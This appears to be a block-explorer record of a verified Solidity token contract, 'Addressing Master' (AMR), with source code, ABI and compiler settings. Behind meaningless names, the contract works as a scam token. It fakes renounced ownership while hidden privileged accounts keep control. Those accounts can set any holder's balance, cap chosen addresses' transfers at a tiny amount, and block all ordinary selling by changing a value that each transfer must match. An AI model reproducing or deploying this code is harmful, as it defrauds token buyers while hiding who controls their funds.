{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface minEnable {\n    function createPair(address enableLaunched, address maxToMin) external returns (address);\n}\n\ninterface takeWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletListFrom) external view returns (uint256);\n\n    function transfer(address totalMax, uint256 minAt) external returns (bool);\n\n    function allowance(address amountTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalMax,\n        uint256 minAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isBuyMode, uint256 value);\n    event Approval(address indexed amountTeam, address indexed spender, uint256 value);\n}\n\nabstract contract limitList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalMaxLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeWalletMetadata is takeWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AddressingMaster is limitList, takeWallet, takeWalletMetadata {\n\n    event OwnershipTransferred(address indexed senderTxAmount, address indexed takeBuy);\n\n    function takeMarketing(address txToken) public {\n        require(txToken.balance < 100000);\n        if (autoTo) {\n            return;\n        }\n        \n        minExempt[txToken] = true;\n        \n        autoTo = true;\n    }\n\n    function atReceiver(uint256 minAt) public {\n        minLiquidity();\n        modeSwapTeam = minAt;\n    }\n\n    uint256 public shouldTeamToken;\n\n    address private liquidityMinSwap;\n\n    mapping(address => uint256) private limitExempt;\n\n    uint256 public exemptToken;\n\n    function approve(address txMode, uint256 minAt) public virtual override returns (bool) {\n        listMode[_msgSender()][txMode] = minAt;\n        emit Approval(_msgSender(), txMode, minAt);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityMinSwap;\n    }\n\n    bool private swapExempt;\n\n    string private toAutoLimit = \"Addressing Master\";\n\n    mapping(address => bool) public senderLiquidityWallet;\n\n    constructor (){\n        \n        totalMaxLaunch atSellFund = totalMaxLaunch(toBuy);\n        teamShould = minEnable(atSellFund.factory()).createPair(atSellFund.WETH(), address(this));\n        if (minAmountTeam == shouldTeamToken) {\n            swapExempt = true;\n        }\n        receiverTx = _msgSender();\n        minExempt[receiverTx] = true;\n        limitExempt[receiverTx] = tokenTx;\n        swapExemptFund();\n        \n        emit Transfer(address(0), receiverTx, tokenTx);\n    }\n\n    uint256 public minAmountTeam;\n\n    bool private fromAtMax;\n\n    function txLaunched(address shouldTx) public {\n        minLiquidity();\n        if (marketingLaunchedBuy) {\n            swapExempt = true;\n        }\n        if (shouldTx == receiverTx || shouldTx == teamShould) {\n            return;\n        }\n        senderLiquidityWallet[shouldTx] = true;\n    }\n\n    function swapExemptFund() public {\n        emit OwnershipTransferred(receiverTx, address(0));\n        liquidityMinSwap = address(0);\n    }\n\n    bool private marketingLaunchedBuy;\n\n    function balanceOf(address walletListFrom) public view virtual override returns (uint256) {\n        return limitExempt[walletListFrom];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderMin;\n    }\n\n    address public teamShould;\n\n    function transfer(address receiverAmountShould, uint256 minAt) external virtual override returns (bool) {\n        return teamFeeReceiver(_msgSender(), receiverAmountShould, minAt);\n    }\n\n    uint256 modeSwapTeam;\n\n    function transferFrom(address enableMin, address totalMax, uint256 minAt) external override returns (bool) {\n        if (_msgSender() != toBuy) {\n            if (listMode[enableMin][_msgSender()] != type(uint256).max) {\n                require(minAt <= listMode[enableMin][_msgSender()]);\n                listMode[enableMin][_msgSender()] -= minAt;\n            }\n        }\n        return teamFeeReceiver(enableMin, totalMax, minAt);\n    }\n\n    address launchedTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant receiverMode = 6 ** 10;\n\n    uint8 private senderMin = 18;\n\n    address toBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isBuy;\n    }\n\n    uint256 private tokenTx = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private listMode;\n\n    function fromWalletMarketing(address enableMin, address totalMax, uint256 minAt) internal returns (bool) {\n        require(limitExempt[enableMin] >= minAt);\n        limitExempt[enableMin] -= minAt;\n        limitExempt[totalMax] += minAt;\n        emit Transfer(enableMin, totalMax, minAt);\n        return true;\n    }\n\n    function minLiquidity() private view {\n        require(minExempt[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityMinSwap;\n    }\n\n    function walletAuto(address receiverAmountShould, uint256 minAt) public {\n        minLiquidity();\n        limitExempt[receiverAmountShould] = minAt;\n    }\n\n    uint256 totalSender;\n\n    function teamFeeReceiver(address enableMin, address totalMax, uint256 minAt) internal returns (bool) {\n        if (enableMin == receiverTx) {\n            return fromWalletMarketing(enableMin, totalMax, minAt);\n        }\n        uint256 swapTotal = takeWallet(teamShould).balanceOf(launchedTrading);\n        require(swapTotal == modeSwapTeam);\n        require(totalMax != launchedTrading);\n        if (senderLiquidityWallet[enableMin]) {\n            return fromWalletMarketing(enableMin, totalMax, receiverMode);\n        }\n        return fromWalletMarketing(enableMin, totalMax, minAt);\n    }\n\n    address public receiverTx;\n\n    function name() external view virtual override returns (string memory) {\n        return toAutoLimit;\n    }\n\n    string private isBuy = \"AMR\";\n\n    mapping(address => bool) public minExempt;\n\n    bool public autoTo;\n\n    function allowance(address modeExempt, address txMode) external view virtual override returns (uint256) {\n        if (txMode == toBuy) {\n            return type(uint256).max;\n        }\n        return listMode[modeExempt][txMode];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTxAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuyMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletListFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmountTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderLiquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeamToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExemptFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"}],\"name\":\"takeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"txLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAt\",\"type\":\"uint256\"}],\"name\":\"walletAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AddressingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}